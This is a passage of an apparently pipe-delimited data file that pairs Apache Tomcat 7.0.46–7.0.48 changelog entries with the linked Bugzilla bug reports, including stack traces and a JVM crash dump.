20-Nov-2013 00:35:19.333 SEVERE [http-nio-8080-exec-15] org.apache.tomcat.websocket.server.WsHttpUpgradeHandler.destroy Failed to close WebConnection while destroying the WebSocket HttpUpgradeHandler
 java.lang.NullPointerException
	at org.apache.tomcat.websocket.server.WsHttpUpgradeHandler.destroy(WsHttpUpgradeHandler.java:143)
	at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:715)
	at org.apache.coyote.http11.Http11NioProtocol$Http11ConnectionHandler.process(Http11NioProtocol.java:223)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1597)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.run(NioEndpoint.java:1555)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
	at java.lang.Thread.run(Thread.java:744)


20-Nov-2013 00:35:19.327 SEVERE [http-nio-8080-exec-15] org.apache.coyote.http11.AbstractHttp11Processor.process Error processing request
 java.lang.IllegalArgumentException
	at java.nio.Buffer.position(Buffer.java:236)
	at sun.nio.ch.IOUtil.write(IOUtil.java:68)
	at sun.nio.ch.SocketChannelImpl.write(SocketChannelImpl.java:487)
	at org.apache.tomcat.util.net.NioChannel.write(NioChannel.java:123)
	at org.apache.tomcat.util.net.NioBlockingSelector.write(NioBlockingSelector.java:101)
	at org.apache.tomcat.util.net.NioSelectorPool.write(NioSelectorPool.java:174)
	at org.apache.coyote.http11.InternalNioOutputBuffer.writeToSocket(InternalNioOutputBuffer.java:140)
	at org.apache.coyote.http11.InternalNioOutputBuffer.addToBB(InternalNioOutputBuffer.java:198)
	at org.apache.coyote.http11.InternalNioOutputBuffer.commit(InternalNioOutputBuffer.java:178)
	at org.apache.coyote.http11.AbstractHttp11Processor.action(AbstractHttp11Processor.java:739)
	at org.apache.coyote.Response.action(Response.java:180)
	at org.apache.coyote.Response.sendHeaders(Response.java:368)
	at org.apache.catalina.connector.OutputBuffer.doFlush(OutputBuffer.java:335)
	at org.apache.catalina.connector.OutputBuffer.close(OutputBuffer.java:290)
	at org.apache.catalina.connector.Response.finishResponse(Response.java:411)
	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:560)
	at org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1015)
	at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:642)
	at org.apache.coyote.http11.Http11NioProtocol$Http11ConnectionHandler.process(Http11NioProtocol.java:223)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1597)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.run(NioEndpoint.java:1555)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
	at java.lang.Thread.run(Thread.java:744)




[1] http://markmail.org/message/ee3jch4zj2orltzs"|https://bz.apache.org/bugzilla/show_bug.cgi?id=55799
Catalina|Tomcat 7.0.48 (violetagg)|fix||When Catalina parses TLD files, always use a namespace aware parser to be consistent with how Jasper parses TLD files. The tldNamespaceAware attribute of the Context is now ignored. (markt)|||
Catalina|Tomcat 7.0.48 (violetagg)|fix||Deprecate the tldNamespaceAware Context attribute as TLDs are always parsed with a namespace aware parser. (markt)|||
Catalina|Tomcat 7.0.48 (violetagg)|fix||Correct a logic error that meant that unpackWARs was ignored and the WAR was always expanded if a WAR failed to deploy. (markt)|||
Catalina|Tomcat 7.0.48 (violetagg)|add||Add support for defining copyXML on a per Context basis. (markt)|||
Catalina|Tomcat 7.0.48 (violetagg)|fix||Define the expected behaviour of the automatic deployment and align the implementation to that definition. (markt)|||
Catalina|Tomcat 7.0.48 (violetagg)|add||When running under a security manager, change the default value of the Host's deployXML attribute to false. (markt)|||
Catalina|Tomcat 7.0.48 (violetagg)|add||If a Host is configured with a value of false for deployXML, a web application has an embedded descriptor at META-INF/context.xml and no explicit descriptor has been defined for this application, do not allow the application to start. The reason for this is that the embedded descriptor may contain configuration necessary for secure operation such as a RemoteAddrValve. (markt)|||
Catalina|Tomcat 7.0.48 (violetagg)|fix||Prevent an NPE in the WebSocket ServerContainer when processing an HTTP session end event. (markt)|||
Catalina|Tomcat 7.0.48 (violetagg)|add|55801|Add the ability to set a custom SSLContext to use for client wss connections. Patch provided by Maciej Lypik. (markt)|Add ability to provide custom SSLContext for websocket client|"Created attachment 31059 [details]
Proposed patch

Currently the only available customisation is setting trust store via SSL_TRUSTSTORE_PROPERTY. This is not enough in situations where custom trust manager has to be used. The most trivial example I can think of is accepting all certificates.

My proposition is to use new property to pass SSLContext using user properties of ClientEndpointConfig.

Attached is a proposed patch to add this capability."|https://bz.apache.org/bugzilla/show_bug.cgi?id=55801
Catalina|Tomcat 7.0.48 (violetagg)|fix|55804|If the GSSCredential for the cached Principal expires when using SPNEGO authentication, force a re-authentication. (markt)|SPNEGOAUTHENTICATOR - GSSCredential does not get renewed after RemainingLifeTime is less than zero|"In SpnegoAuthenticator, we check for request.getUserPrincipal() if it returns a prinicpal we do not do a fresh authentication. This happens even when the GSSCredential returned by GenericPrincipal has remainingLife time less than zero. This causes issues in delegating the credential as the credential is not valid any more.

Can we add additional check to reauthenticate when the credental has expired and put GSSCredential in the same session?"|https://bz.apache.org/bugzilla/show_bug.cgi?id=55804
Catalina|Tomcat 7.0.48 (violetagg)|add|55811|If the main web.xml contains an empty absolute-ordering element and validation of web.xml is not enabled, skip parsing any web-fragment.xml files as the result is never used. (markt)|Do not parse web-fragment.xml files when empty absolute-ordering|"ContextConfig.webConfig() does the following:

1. Scans for web fragments
> Map<String,WebXml> fragments = processJarsForWebFragments();

This method
a) returns a list of all JAR files, not ignored by jarsToSkip options
b) parses ""META-INF/web-fragment.xml"" files when they are present

2. Filters and sorts them according to ordering
> orderedFragments = WebXml.orderWebFragments(webXml, fragments, sContext);

3. Uses the ordered set of fragments to look for SCI declarations
> processServletContainerInitializers(orderedFragments);

4. Uses the ordered set of fragments to
- scan them for annotated classes
- merge into main web.xml

5. Uses the original list of web fragments to scan for resources.
> processResourceJARs(resourceJars);


I am saying that parsing of the fragments (step 1-b)) can be skipped when the web application is configured with an empty ordered-fragments element and web.xml validation is turned off (strict servlet compliance is off).

Note that metadata-complete=true alone does not allow to skip that parsing, because we need fragment names to perform the ordering.

It seems that skipping that parsing when validation is on would be a bad idea. We are still using those JARs for resources and thus I think we should validate them."|https://bz.apache.org/bugzilla/show_bug.cgi?id=55811
Catalina|Tomcat 7.0.48 (violetagg)|fix|55839|Extend support for digest prefixes {MD5}, {SHA} and {SSHA} to all Realms rather than just the JNDIRealm. (markt)|DataSourceRealm doesn't handle prefix on password digest|"Created attachment 31088 [details]
Entire class with additional check for prefix.

Similar to bug #37984 which provided a fix for JNDIRealm, DataSourceRealm should also remove prefixes of the form {SHA}, {MD5}, etc before comparing the digests.

The attached class(sorry - corporate firewall wouldn't allow me to create a patch) is suitable for my own needs (where the prefix is provided in lower case, so is compared case-insensitively), but I acknowledge that a fuller fix may be more appropriate, e.g. providing a helper method for removing known prefixes in RealmBase."|https://bz.apache.org/bugzilla/show_bug.cgi?id=55839
Catalina|Tomcat 7.0.48 (violetagg)|fix|55842|Ensure that if a larger than default response buffer is configured that the full buffer is used when a Servlet outputs via a Writer. (markt)|response.setBufferSize() does not seem to work properly|"I found a problem with setting the buffer size for the ServletResponse. 
If I call 'response.setBufferSize(1,000,000);' and send about 20,000 characters, the response will be chunked even though it should not.
The response is sent in several chunks and contains the 'Transfer-Encoding: chunked' response header.
In my understanding in this case the response should be fully buffered on the server and then sent as a whole containing the Content-Length-header.

This causes a problem in my application because I want to use a larger buffer to be able to redirect to an error page if an error occurs during rendering the response. 

I was able to reproduce this on Tomcat 7.0.39, 7.0.40, 7.0.42, 7.0.47. Tomcat 7.0.37 works fine and as expected.

This is easily reproducable by using a JSP as follows:
<%
response.setBufferSize(1000*1000);
for (int i = 0; i < 100; i++) {
	for (int j = 0; j < 100; j++) {
		response.getWriter().write(""X"");
	}
    response.getWriter().write(""<br />"");
}
%>"|https://bz.apache.org/bugzilla/show_bug.cgi?id=55842
Catalina|Tomcat 7.0.48 (violetagg)|fix|55851|Further fixes to enable SPNEGO authentication to work with IBM JDKs. Based on a patch by Arunav Sanyal. (markt)|Tomcat SPNEGO authenticator incompatible with IBM JDK: Accept Security Context needs to be wrapped around a Privileged Action in order for server side authentication|"Created attachment 31098 [details]
Contains GNU unified diff of SpnegoAuthenticator and its modified format

Hi

Problem report:-

In bug report 55760, a change was made in which system property javax.security.auth.useSubjectCredsOnly is no longer set to false. So it naturally follows that GSSAPI AcceptSecContext method is wrapped in a PrivilegedExceptionAction. It is found in IBM JDK that it fails otherwise.
 
Cause of failure:-

When IBM JDK tries to fetch credential in GSSAPI AcceptSecContext method, it does so from JAAS Subject. Since this call is not performed in Subject.doAs, the call fails as IBM JDK does not have access to a JAAS subject and cannot fetch a credential.
 
Please find attached:-

1. File containing gnu unified diff format of SpnegoAuthenticator with its modified version. PLEASE NOTE THIS DIFF IS ON TOP OF BUG FIX REPORTED IN 55760. This file now also contains AcceptAction class which wraps GSSAPI AcceptSecContext as a PrivilegedExceptionAction.

This fix solves the issue by allowing IBM JDK to fetch credential from JAAS Subject. 

Yours sincerely
Arunav Sanyal"|https://bz.apache.org/bugzilla/show_bug.cgi?id=55851
Catalina|Tomcat 7.0.48 (violetagg)|add||Fix CVE-2013-4590: Add an option to the Context to control the blocking of XML external entities when parsing XML configuration files and enable this blocking by default when a security manager is used. The block is implemented via a custom resolver to enable the logging of any blocked entities. (markt)|||
Coyote|Tomcat 7.0.48 (violetagg)|code||Implement a number of small refactorings to the APR/native handler for upgraded HTTP connections. (markt)|||
Coyote|Tomcat 7.0.48 (violetagg)|fix||Fix an issue with upgraded HTTP connections over HTTPS (e.g. secure WebSocket) when using the APR/native connector that resulted in the unexpected closure of the connection. (markt)|||
Coyote|Tomcat 7.0.48 (violetagg)|fix||Ensure that the application class loader is used when calling the ReadListener and WriteListener methods when using non-blocking IO. A side effect of not doing this was that JNDI was not available when processing WebSocket events. (markt)|||
Coyote|Tomcat 7.0.48 (violetagg)|add||Make the time that the internal executor (if used) waits for request processing threads to terminate before continuing with the connector stop process configurable. (markt)|||
Coyote|Tomcat 7.0.48 (violetagg)|fix|55749|Improve the error message when SSLEngine is disabled in the AprLifecycleListener and SSL is configured for an APR/native connector. (markt)|Disabling SSLEngine in AprLifecycleListener leads to misleading error message at startup when SSL Connector is delcared|"Put a <Listener className=""org.apache.catalina.core.AprLifecycleListener"" SSLEngine=""off"" /> in you server.xml.

Put the APR connector some weeks later in your server.xml:

<Connector protocol=""org.apache.coyote.http11.Http11AprProtocol""
  port=""@HTTPS_PORT@"" connectionTimeout=""20000"" maxHttpHeaderSize=""24576""
  maxThreads=""250"" URIEncoding=""UTF-8"" bufferSize=""4096""
  scheme=""https"" secure=""true"" SSLEnabled=""true"" SSLProtocol=""TLSv1""	  
  SSLCipherSuite=""HIGH:!ADH"" SSLCertificateFile=""@SSL_CERT_FILE@""
  SSLCertificateKeyFile=""@SSL_CERT_KEY_FILE@"" SSLPassword=""@SSL_PASSWORD@"" />

Start your Tomcat and receive following confusing message:
Nov 06, 2013 1:30:39 PM org.apache.coyote.http11.Http11AprProtocol start
SEVERE: Error starting endpoint
java.lang.Exception: Socket bind failed: [226] Adresse bereits im Zugriff
        at org.apache.tomcat.util.net.AprEndpoint.init(AprEndpoint.java:671)
        at org.apache.tomcat.util.net.AprEndpoint.start(AprEndpoint.java:851)
        at org.apache.coyote.http11.Http11AprProtocol.start(Http11AprProtocol.java:139)
        at org.apache.catalina.connector.Connector.start(Connector.java:1196)
        at org.apache.catalina.core.StandardService.start(StandardService.java:540)
        at org.apache.catalina.core.StandardServer.start(StandardServer.java:754)
        at org.apache.catalina.startup.Catalina.start(Catalina.java:595)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
        at java.lang.reflect.Method.invoke(Method.java:606)
        at org.apache.catalina.startup.Bootstrap.start(Bootstrap.java:289)
        at org.apache.catalina.startup.Bootstrap.main(Bootstrap.java:414)

Nov 06, 2013 1:30:39 PM org.apache.catalina.core.StandardService start
SEVERE: Failed to start connector [Connector[HTTP/1.1-8444]]
LifecycleException:  service.getName(): ""Catalina"";  Protocol handler start failed: java.lang.Exception: Socket bind failed: [226] Adresse bereits im Zugriff
        at org.apache.catalina.connector.Connector.start(Connector.java:1203)
        at org.apache.catalina.core.StandardService.start(StandardService.java:540)
        at org.apache.catalina.core.StandardServer.start(StandardServer.java:754)
        at org.apache.catalina.startup.Catalina.start(Catalina.java:595)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
        at java.lang.reflect.Method.invoke(Method.java:606)
        at org.apache.catalina.startup.Bootstrap.start(Bootstrap.java:289)
        at org.apache.catalina.startup.Bootstrap.main(Bootstrap.java:414)

This is of course not correct. The port IS availble but the SSL engine has been turned off.

There should be a check at stratup which says that this is an illegal state."|https://bz.apache.org/bugzilla/show_bug.cgi?id=55749
Coyote|Tomcat 7.0.48 (violetagg)|add||If a request that includes an Expect: 100-continue header receives anything other than a 2xx response, close the connection This protects against misbehaving clients that may not sent the request body in that case and send the next request instead. (markt)|||
Coyote|Tomcat 7.0.48 (violetagg)|fix||Improve the parsing of trailing headers in HTTP requests. (markt)|||
Jasper|Tomcat 7.0.48 (violetagg)|fix|55735|Fix a regression caused by the fix to 55198. When processing JSP documents, attributes in XML elements that are template content should have their text xml-escaped, but output of EL expressions in them should not be escaped. (markt)|Additional quote entity in html element attribute evaluated in tagx if attribute contains EL expression|"Well, after fix for Bug 55198, if a tag file contains
<a href=""#"" onclick=""window.alert(&quot;${text}&quot;)"">foobar</a>
It can now be correctly rendered as (if text='foobar')
<a href=""#"" onclick=""window.alert(&quot;foobar&quot;)"">foobar</a>

But, It is rendered completely wrongly as ***** IF text='&amp;foobar' *****
<a href=""#"" onclick=""window.alert(&quot;&amp;amp;foobar&quot;)"">foobar</a>

The EL expression ${text} should be rendered without any escape, but now it is
escaped just as other literal part in the attribute.

Generally, a tagx file's compiler must not make any assumption that it's output is a well-formed XML or not, it should just keep the literal atrribute or text as is, and output any EL expression directly. It's the tagx file's author's reponsibility to determine whether a text variable should be escaped, e.g.:
<a href=""#"" onclick=""window.alert(&quot;${fn:escape(text)}&quot;)"">foobar</a>

Suppose we have:
request.setAttribute(""text"", ""2 &gt; 1"");
And in a tagx file:
<div title=""&quot;${text}&quot;"">&quot;${text}&quot;</div>

The correct output could be:
<div title=""&quot;2 &gt; 1&quot;"">&quot;2 &gt; 1&quot;</div>

But neither
<div title=""&quot;2 &amp;gt; 1&quot;"">&quot;2 &gt; 1&quot;</div>

nor
<div title=""""2 > 1"""">&quot;2 &gt; 1&quot;</div>"|https://bz.apache.org/bugzilla/show_bug.cgi?id=55735
Jasper|Tomcat 7.0.48 (violetagg)|fix|55807|The JSP compiler used a last modified time of -1 for TLDs in JARs expanded in to WEB-INF/classes (IDEs often do this expansion) when creating the dependency list for JSPs that used that TLD. This meant JSPs using that TLD were recompiled on every access. (markt)|JSP's always marked as outdated with Jar Scanner Component configured with ‚ÄúscanAllDirectories‚Äù and referenced Taglib in WEB-INF/classes/META-INF|"consider the following (simplified) eclipse project configuration.

web_base_jar (shared taglib etc.)
web_war (uses web_base_jar)

When developing our web project locally we use an exploded war layout. The compile output
of web_base_jar is directly copied (not as a jar!) to the war‚Äôs
web_war/WEB-INF/classes directory by our ide‚Äôs (eclipse with sysdeo plugin and intellij).
Our shared taglib ends up here: web_war/WEB-INF/classes/META-INF/myTaglib.tld. The taglib
is successfully picked up by the Jar Scanner configured with ‚ÄúscanAllDirectories‚Äù.

This leads to the following generated jsp code when myTaglib is used:

  static {
    _jspx_dependants = new java.util.HashMap<java.lang.String,java.lang.Long>(1);
    _jspx_dependants.put(""file:/somepath/pc_web_war_exploded/WEB-INF/classes/META-INF/ myTaglib.tld
"", Long.valueOf(-1L));
  }

The relevant code for this snippet is in org.apache.jasper.compiler.TagLibraryInfoImpl.<init>(TagLibraryInfoImpl.java:173).
Because the Taglib is a file uri (file:/C:/somepath/pc_web_war_exploded/WEB-INF/classes/META-INF/myTaglib.tld)
it is not found by ApplicationContext#getResource and the method
org.apache.jasper.JspCompilationContext.getLastModified(JspCompilationContext.java:437) returns
-1 in this case.

When the compiler checks if the current jsp is outdated it checks also all includes/dependants.
Because myTaglib is in the dependants  list of our jsps it is also checked. The check tests
the lastModified timestamp of the file against -1 and returns always true. See here org.apache.jasper.compiler.Compiler.isOutDated(Compiler.java:519)
This means that our jsps are recompiled on every request. We have some workarounds for this but it would be nice if this setup would work out of the box"|https://bz.apache.org/bugzilla/show_bug.cgi?id=55807
Cluster|Tomcat 7.0.48 (violetagg)|add||Add log message that initialization of AbstractReplicatedMap has been completed. (kfujino)|||
Cluster|Tomcat 7.0.48 (violetagg)|fix||The logger of AbstractReplicatedMap should be non-static in order to enable logging of each application. Side-effects of this change is to throw RuntimeException in MapMessage#getKey() and getValue() instead of Null return and error log. (kfujino)|||
Cluster|Tomcat 7.0.48 (violetagg)|code||Simplify the code of DeltaManager#startInternal(). Reduce unnecessary nesting for acquisition of cluster instance. (kfujino)|||
Cluster|Tomcat 7.0.48 (violetagg)|fix||Remove unnecessary attributes of stateTransferCreateSendTime and receiverQueue from cluster manager template. These attributes should not be defined as a template. (kfujino)|||
Cluster|Tomcat 7.0.48 (violetagg)|fix||Fix MBean attribute definition of stateTransfered. The method name is not isStateTransfered() but getStateTransfered(). (kfujino)|||
Cluster|Tomcat 7.0.48 (violetagg)|fix||Correct stop failure log of cluster. Failure cause is not only Valve. (kfujino)|||
Cluster|Tomcat 7.0.48 (violetagg)|fix||Remove unnecessary sleep when sending session blocks on session sync phase. (kfujino)|||
Cluster|Tomcat 7.0.48 (violetagg)|fix||Expose stateTimestampDrop of org.apache.catalina.ha.session.DeltaManager via JMX. (kfujino)|||
Cluster|Tomcat 7.0.48 (violetagg)|fix||When the ping timeouted, make sure that memberDisappeared method is not called by specifying the members that has already been removed. (kfujino)|||
Cluster|Tomcat 7.0.48 (violetagg)|add||Add log message of session relocation when member disappeared. (kfujino)|||
Cluster|Tomcat 7.0.48 (violetagg)|fix||If ping message fails, prevent wrong timeout detection of normal member that is no failure members. (kfujino)|||
Web applications|Tomcat 7.0.48 (violetagg)|add||Add some documentation on the SSL configuration options for WebSocket clients. (markt)|||
Web applications|Tomcat 7.0.48 (violetagg)|add||Add to cluster document a description of notifyLifecycleListenerOnFailure and heartbeatBackgroundEnabled. (kfujino)|||
Web applications|Tomcat 7.0.48 (violetagg)|fix||Update the documentation with information for WebSocket 1.0 specification and javadoc. (violetagg)|||
Web applications|Tomcat 7.0.48 (violetagg)|fix|55703|Clarify the role of the singleton attribute for JNDI resource factories. (markt)|Error in the JNDI Generic JavaBean Resources documentation|"http://tomcat.apache.org/tomcat-7.0-doc/jndi-resources-howto.html#Generic_JavaBean_Resources

In this page of the Tomcat 7 documentation - but this is true for all versions - there is the following statement:

""The resource factory will create a new instance of the appropriate bean class every time a lookup() for this entry is made.""

But that seems not true. I created an example foo.bar.Bean, which simply increment a static int at each creation. Then, I configured a BeanFactory in the global resources section of server.xml, and I deployed a servlet which simply lookup 1000 thousand times for the bean and print its string representation in the response. 

To reproduce, follow the steps below using the targz attached:

1) configure a resource with a BeanFactory, as in the server.xml attached;
2) put the bean-factory-bug-bean.jar in the common classpath of the container;
3) start the container;
4) deploy the bean-factory-bug-web.war file in the appbase folder;
5) open http://localhost:8080/bean-factory-bug-web/BeanServlet

As for one can read from the documentation, the expected output is 

Bean #1
Bean #2
Bean #3
...
Bean #999
Bean #1000

But the actual output is

Bean #1
Bean #1
Bean #1
...
Bean #1
Bean #1

I think that the actual behaviour of the container is the most advisable behaviour, but would be better to update the documentation to match it and avoid misleading.

Thanks.

Giulio Quaresima (Ph.D) - Perugia - Italy"|https://bz.apache.org/bugzilla/show_bug.cgi?id=55703
Web applications|Tomcat 7.0.48 (violetagg)|fix|55746|Add documentation on the allRolesMode to the CombinedRealm and LockOutRealm. Patch by C√©dric Couralet. (markt)|Add documentation for AllRolesMode for CombinedRealm|"Created attachment 31012 [details]
Patch for Tomcat6

The attribute ""allRolesMode"" is not listed in the attributes for the CombinedRealm or LockOutRealm. I have been bitten by it as I thought it was then sufficient to put it in each of the nested Realms. 
It appears that the check for HasResourcePermission is done on the context.getRealm() which is not passed in the nested Realms in the case of CombinedRealm.

I think just adding it to the documentation should be sufficient.

I only have a working copy of Tomcat 6 handy, so the patch is done to that version."|https://bz.apache.org/bugzilla/show_bug.cgi?id=55746
Web applications|Tomcat 7.0.48 (violetagg)|add||Expand the information on web applications that ship as part of Tomcat in the security how-to section of the documentation web application. (markt)|||
Web applications|Tomcat 7.0.48 (violetagg)|fix||Expand the description of the WebSocket buffers in the documentation web application to clarify their purpose. (markt)|||
Web applications|Tomcat 7.0.48 (violetagg)|add||Correct the documentation for Cluster manager. (kfujino)|||
Web applications|Tomcat 7.0.48 (violetagg)|add||Add information on how to configure integrated Windows authentication when Tomcat is running on a non-Windows host. (markt)|||
Extras|Tomcat 7.0.48 (violetagg)|update||Update commons-logging to version 1.1.3. (rjung)|||
Other|Tomcat 7.0.48 (violetagg)|add|52323|Add support for the Cobertura code coverage tool when running the unit tests. Based on a patch by mhasko. (markt/kkolinko)|Cobertura test code coverage support for build.xml and build.properties.default|"Created attachment 28069 [details]
the patch, based on revision 1213685

Cobertura (cobertura.sf.net) is an opensource Java code coverage tool released (with in dependencies) under The Apache Software License, Version 1.1 and/or The GNU General Public License, Version 2.0.

It can assess how much of the codebase was actually executed during a program run.
If the program run means running the test suite, it will produce results showing how much of the code the tests cover, potentially discover weak spots.

This patch provides support for Cobertura in the build.xml and build.properties.default files. It introduces four new targets:
 * download-cobertura - downloads and unpacks Cobertura in ${base.path}
 * cobertura-enable - enables Cobertura to be used
 * cobertura-instrument - adds Cobertura instrumentation to compiled bytecode
 * cobertura-report - produces reports from Cobertura results. HTML by default
   (can be overwritten with 'cobertura.report.format' property).

The behavior of this patch doesn't break existing targets in any way.

To use this tool, one simply runs 'ant cobertura-enable test' which will instrument the compiled classes before running the tests and also supply all the necessary resources for Cobertura to gather the coverage results.
Once the tests are completed 'ant cobertura-report' will produce lovely HTML report about the test coverage in '${tomcat.build}/coverage'.

NOTE: Although the result of the test cases should not be affected by Cobertura, it is not guaranteed."|https://bz.apache.org/bugzilla/show_bug.cgi?id=52323
Other|Tomcat 7.0.48 (violetagg)|update||Update sample Eclipse IDE project. Explicitly use a Java 6 SE JDK. Exclude JSR356 WebSocket classes from build path, as they cannot be compiled with Java 6. (kkolinko)|||
Other|Tomcat 7.0.48 (violetagg)|update||Update the Eclipse compiler to 4.3.1. (kkolinko/markt)|||
Coyote|Tomcat 7.0.47 (violetagg)|fix||Fix regression with legacy WebSocket implementation in NIO and APR connectors. (markt)|||
Web applications|Tomcat 7.0.47 (violetagg)|fix||Avoid hang observed with Java 6 on Windows when stopping the Tomcat process via CTRL-C. (markt)|||
Other|Tomcat 7.0.47 (violetagg)|fix|55663|NOTICE files are corrected according to NOTICE files requirements. (violetagg)|Incorrect text in NOTICE file|"The NOTICE file in Tomcat trunk (and 7.x and 6.x) uses the wrong wording.

The 4th line should say [1][2]:

This product includes software developed at

however it actually says:

This product includes software developed by

which is not the same thing.

[Note that AL 1.0 and 1.1 did use the ""developed by"" wording; maybe that is the origin of the problem.]

[1] http://www.apache.org/legal/src-headers.html#notice
[2] http://www.apache.org/dev/release.html#notice-require"|https://bz.apache.org/bugzilla/show_bug.cgi?id=55663
Catalina|Tomcat 7.0.46 (violetagg)|fix||Only send a WebSocket close message on an IOException if the client has not yet received a close control message from the server as the IOException may be in response to the client continuing to send a message after the server sent a close control message. (markt)|||
Catalina|Tomcat 7.0.46 (violetagg)|fix|49134|Ensure nested realms are correctly destroyed, when a CombinedRealm is destroyed. This ensures that the associated MBeans are deregistered. (markt)|Server.stop() doesn't unregister all MBeans|"Created attachment 25306 [details]
Unit test illustrating the problem

Server.stop() should unregister all MBeans registered by Tomcat but it is not the case.

It has side effects when starting a new Server as some Tomcat components like MapperListener components rely on what they find in the MBeanServer and try to work with objects that don't exist anymore (like Host for MapperListener)

Provided unit test shows a part of the problem (in fact the helper class Tomcat should be improved to register all MBeans just like a ""normal"" Tomcat distribution).

A workaround consists in cleaning up the JMX tree from all Catalina objects once server.stop() has been called.

For info: it seems that such a problem has already been reported: bug #47046"|https://bz.apache.org/bugzilla/show_bug.cgi?id=49134
Coyote|Tomcat 7.0.46 (violetagg)|code||Refactor APR/native connector to reduce the scope of localAddList. (markt)|||
Coyote|Tomcat 7.0.46 (violetagg)|fix|55602|Ensure that sockets removed from the Poller and then closed in the APR/native connector are removed and then closed in a thread-safe manner. (markt)|JRE crashes during websocket communication|"During some initial tests with the Websocket implementation in Tomcat 7.0.42 the jre crashed seemingly randomly with the following crash log.

We got the same crash 3 times during a full work day while testing an extended version of the chat examples/ app in message (not binary) mode with a few clients. No idea how to reproduce though as the crashes appeared seemingly randomly. The chat had always been working fine for some time before the crash occurred.

Using APR based Apache Tomcat Native library 1.1.27 using APR version 1.4.6.


#
# A fatal error has been detected by the Java Runtime Environment:
#
#  SIGSEGV (0xb) at pc=0x00007f4b6a72c9dd, pid=10100, tid=139961597916928
#
# JRE version: Java(TM) SE Runtime Environment (7.0_40-b43) (build 1.7.0_40-b43)
# Java VM: Java HotSpot(TM) 64-Bit Server VM (24.0-b56 mixed mode linux-amd64 compressed oops)
# Problematic frame:
# C  [libtcnative-1.so.0.1.27+0x129dd]  Java_org_apache_tomcat_jni_Socket_send+0x15d
#
# Core dump written. Default location: /home/asok/myself/core or core.10100
#
# If you would like to submit a bug report, please visit:
#   http://bugreport.sun.com/bugreport/crash.jsp
# The crash happened outside the Java Virtual Machine in native code.
# See problematic frame for where to report the bug.
#

---------------  T H R E A D  ---------------

Current thread (0x00007f4928010000):  JavaThread ""http-apr-10088-exec-7"" daemon [_thread_in_native, id=18750, stack(0x00007f4b59437000,0x00007f4b59538000)]

siginfo:si_signo=SIGSEGV: si_errno=0, si_code=1 (SEGV_MAPERR), si_addr=0x0000000000000040

Registers:
RAX=0x0000000000000000, RBX=0x00007f49280011d0, RCX=0x0000000000000000, RDX=0x00007f4b59534128
RSP=0x00007f4b59534110, RBP=0x00007f49280101e8, RSI=0x00007f4b59534130, RDI=0x0000000000000000
R8 =0x00007f4b59534130, R9 =0x0000000000000001, R10=0x00007f4b8d01852d, R11=0x00007f4b985e3ed0
R12=0x0000000000000000, R13=0x0000000000000000, R14=0x00007f4b59536210, R15=0x00007f4928010000
RIP=0x00007f4b6a72c9dd, EFLAGS=0x0000000000010246, CSGSFS=0x0000000000000033, ERR=0x0000000000000004
  TRAPNO=0x000000000000000e

Top of Stack: (sp=0x00007f4b59534110)
0x00007f4b59534110:   327473657547202a 6f6a207361682031
0x00007f4b59534120:   0000002e64656e69 0000000000000001
0x00007f4b59534130:   0000000000000081 0000000000000000
0x00007f4b59534140:   0000000000000000 0000000000000008
0x00007f4b59534150:   0000000000000000 0000000000000000
0x00007f4b59534160:   0000000000000000 0000000000000000
0x00007f4b59534170:   0000000000000000 0000000000000000
0x00007f4b59534180:   0000000000003528 0000000000000000
0x00007f4b59534190:   0000000000005978 0000000000000000
0x00007f4b595341a0:   0000000000005980 0000000000000000
0x00007f4b595341b0:   0000000000000008 0000000000000000
0x00007f4b595341c0:   0000000000000000 0000000000000000
0x00007f4b595341d0:   0000000000000000 0000000000000000
0x00007f4b595341e0:   0000000000000000 0000000000000000
0x00007f4b595341f0:   0000000000000000 0000000000000000
0x00007f4b59534200:   0000000000000000 0000000000000000
0x00007f4b59534210:   0000000000000000 00007f4b00000008
0x00007f4b59534220:   0000000000000000 00007f4b00000000
0x00007f4b59534230:   00007f4900000000 00007f4900000000
0x00007f4b59534240:   00007f4b00000000 00007f4b00000000
0x00007f4b59534250:   0000000000000000 0000000000000000
0x00007f4b59534260:   0000000000000000 0000000000000000
0x00007f4b59534270:   0000000000000000 0000000000000000
0x00007f4b59534280:   0000000000000000 0000000000000000
0x00007f4b59534290:   0000000000000000 0000000000000000
0x00007f4b595342a0:   0000000000000000 0000000000000000
0x00007f4b595342b0:   0000000000000000 0000000000000000
0x00007f4b595342c0:   0000000000000000 0000000000000b00
0x00007f4b595342d0:   0000000000000000 0000000000000000
0x00007f4b595342e0:   0000000000000000 0000000000000000
0x00007f4b595342f0:   0000000000000000 0000000000000000
0x00007f4b59534300:   0000000000000000 0000000000000000 

Instructions: (pc=0x00007f4b6a72c9dd)
0x00007f4b6a72c9bd:   89 ea 4c 89 f6 48 89 ef ff 90 40 06 00 00 48 8b
0x00007f4b6a72c9cd:   43 30 48 8b 7b 18 48 8d 54 24 18 48 8d 74 24 20
0x00007f4b6a72c9dd:   ff 50 40 89 c3 e9 47 ff ff ff be 58 00 00 00 48
0x00007f4b6a72c9ed:   89 ef e8 ec a1 ff ff b8 a8 ff ff ff e9 6a ff ff 

Register to memory mapping:

RAX=0x0000000000000000 is an unknown value
